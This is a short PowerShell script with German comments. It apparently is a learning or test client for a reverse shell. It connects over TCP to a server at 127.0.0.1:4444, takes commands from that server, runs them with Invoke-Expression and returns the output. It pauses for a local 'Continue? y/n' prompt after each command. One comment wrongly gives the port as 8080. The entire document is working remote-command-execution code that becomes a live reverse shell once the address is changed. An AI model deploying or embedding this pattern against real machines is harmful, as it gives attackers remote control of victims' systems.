#Setup Variablen
$decision = $true
$result = $null
$message = $null
# Client-Skript: Verbindet sich zum Server auf Port 8080
$serverAddress = "127.0.0.1"  # localhost für Testzwecke
$port = 4444                   # Der gleiche Port wie im Server-Skript

try {
    $client = New-Object System.Net.Sockets.TcpClient($serverAddress, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    # Nachricht an den Server senden
    $message = "Connected!"
    $writer.WriteLine($message)

    while($decision)
    {
        try
        {
            #Befehl vom Server bekommen
            $message = $reader.ReadLine()

            if($message)
            {
                # Führe den empfangenen Befehl aus und sende das Ergebnis zurück
                $result = Invoke-Expression $message
                $writer.WriteLine("$result")
            
                # Überprüft, ob die Verbindung fortgesetzt werden soll
                $question = Read-Host -Prompt "Continue? y/n"
                if($question -eq "y")
                {
                    $decision = $true
                }
                else 
                {        
                    $decision = $false   
                }
            }
        }
        catch
        {
            $writer.WriteLine("Fehler bei Client: $_")
        }

    }
    # Schließe die Verbindung
    $client.Close()
    Write-Output "Verbindung zum Server geschlossen."

} 
catch 
{
    Write-Output "Fehler bei der Verbindung: $_"
}
